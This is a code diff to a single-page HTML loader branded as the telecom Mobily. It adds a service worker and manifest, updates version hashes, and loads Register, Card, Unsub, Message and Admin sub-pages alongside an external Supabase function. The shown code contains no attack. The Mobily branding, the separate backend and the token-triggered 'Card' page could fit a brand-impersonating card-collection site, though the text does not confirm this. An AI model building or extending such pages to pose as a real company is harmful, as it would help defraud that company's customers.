@@ -9,17 +9,19 @@
 <meta property="og:type" content="website">
 <link rel="icon" type="image/png" href="icon-192.png">
 <link rel="apple-touch-icon" href="icon-512.png">
+<link rel="manifest" href="manifest.webmanifest">
 <style>html,body{margin:0;height:100%;background:#060A14;color:#94A3C4;font-family:system-ui,Tahoma,sans-serif}
 .l{height:100%;display:grid;place-items:center;text-align:center}.s{width:34px;height:34px;border-radius:50%;border:3px solid rgba(255,255,255,.15);border-top-color:#22D3EE;animation:r .8s linear infinite;margin:0 auto 12px}
 @keyframes r{to{transform:rotate(360deg)}}</style>
 </head><body><div class="l"><div><div class="s"></div><div id="m">موبايلي - Mobily</div></div></div>
 <script>
+if ('serviceWorker' in navigator) navigator.serviceWorker.register('sw.js').catch(function(){});
 (function(){
   var FN = "https://lhamdnaxioxqptkylvkg.supabase.co/functions/v1/mobily?forceFunctionRegion=ap-south-1";
   var params = {}; new URLSearchParams(location.search).forEach(function(v,k){ params[k]=v; });
   var base = location.href.split('#')[0].split('?')[0];
   function fail(){ document.getElementById('m').innerHTML = 'تعذر الاتصال. تأكد من الإنترنت ثم <a href="" style="color:#22D3EE">أعد المحاولة</a>'; }
-  var V = {"Register":"530fecb5cf","Card":"4ec2cd93b9","Unsub":"4b8be3f65b","Message":"601b6ed5fb","Admin":"92450c403b"};
+  var V = {"Register":"36141af9d8","Card":"0bc9be3336","Unsub":"f3af745d22","Message":"4d7ed8c675","Admin":"12985d4987"};
   var getPage = function(n){ return fetch(base.replace(/[^/]*$/, '') + 'pages/' + n + '.html?v=' + V[n]).then(function(r){ if (!r.ok) throw new Error('page'); return r.text(); }); };
   var guess = params.p === 'admin' ? 'Admin' : params.p === 'unsub' ? 'Unsub' : params.t ? 'Card' : 'Register';
   var early = getPage(guess); early.catch(function(){});
